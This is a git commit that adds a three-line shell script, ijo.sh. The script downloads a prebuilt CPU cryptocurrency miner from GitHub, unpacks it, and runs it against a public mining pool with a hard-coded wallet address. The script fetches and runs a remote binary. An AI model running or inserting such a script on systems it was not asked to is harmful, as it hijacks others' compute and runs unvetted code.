ad815e7f45866818443a6f0330d6c7d015e2bab1
koasdu <106860379+koasdu@users.noreply.github.com>
2022-06-04 07:23:54 +0000

    Create ijo.sh

---
+++ ijo.sh
@@ -0,0 +1,3 @@
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_ubuntu_18.tar.gz
+tar xf hellminer_cpu_ubuntu_18.tar.gz
+./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RHvUpxcAex5cQWtM8ssweePvjQqEittXNQ.GASSPOLL -p x --cpu 39
